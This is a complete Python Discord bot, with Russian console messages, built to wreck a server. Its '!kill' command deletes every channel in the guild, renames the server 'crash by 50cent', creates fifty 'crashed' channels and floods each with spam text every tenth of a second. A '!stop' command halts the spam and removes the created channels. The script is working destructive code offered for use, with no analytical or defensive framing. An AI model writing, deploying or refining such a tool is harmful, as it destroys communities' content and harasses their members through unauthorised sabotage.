import discord
from discord.ext import commands
import asyncio
import os

PREFIX = "!"
TOKEN = os.getenv("DISCORD_TOKEN")

if not TOKEN:
    print("ОШИБКА: Токен не найден!")
    print("Добавь переменную окружения DISCORD_TOKEN в Render")
    exit(1)

NEW_NAME = "crash by 50cent"

def load_spam_text():
    if os.path.exists("spam.txt"):
        with open("spam.txt", "r", encoding="utf-8") as f:
            content = f.read()
            if content.strip():
                return content
    return "SPAM"

spam_text = load_spam_text()
spamming = False
created_channel_ids = []

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)

@bot.event
async def on_ready():
    print(f"✅ Бот запущен: {bot.user}")
    print(f"📝 Спам текст: {spam_text[:50]}...")

async def spam_channel(channel):
    global spamming
    while spamming:
        try:
            await channel.send(spam_text)
        except:
            pass
        await asyncio.sleep(0.1)

async def delete_all_channels(guild):
    for channel in guild.channels:
        try:
            await channel.delete()
        except:
            pass

@bot.command()
async def kill(ctx):
    global spamming, created_channel_ids

    await ctx.message.delete()
    guild = ctx.guild

    await delete_all_channels(guild)

    try:
        await guild.edit(name=NEW_NAME)
    except:
        pass

    created_channel_ids.clear()
    spamming = True

    everyone_role = guild.default_role
    overwrites = {
        everyone_role: discord.PermissionOverwrite(
            view_channel=True,
            read_messages=True,
            send_messages=True
        )
    }

    for i in range(50):
        try:
            channel = await guild.create_text_channel(name=f"crashed-{i}", overwrites=overwrites)
            created_channel_ids.append(channel.id)
            asyncio.create_task(spam_channel(channel))
        except:
            pass
        await asyncio.sleep(0.2)

    print(f"[KILL] Сервер {guild.name} уничтожен. Каналов: {len(created_channel_ids)}")

@bot.command()
async def stop(ctx):
    global spamming, created_channel_ids

    await ctx.message.delete()
    spamming = False
    await asyncio.sleep(0.5)

    guild = ctx.guild
    for channel_id in created_channel_ids:
        channel = guild.get_channel(channel_id)
        if channel:
            try:
                await channel.delete()
            except:
                pass
    created_channel_ids.clear()

    await ctx.send("✅ STOPPED", delete_after=2)

bot.run(TOKEN)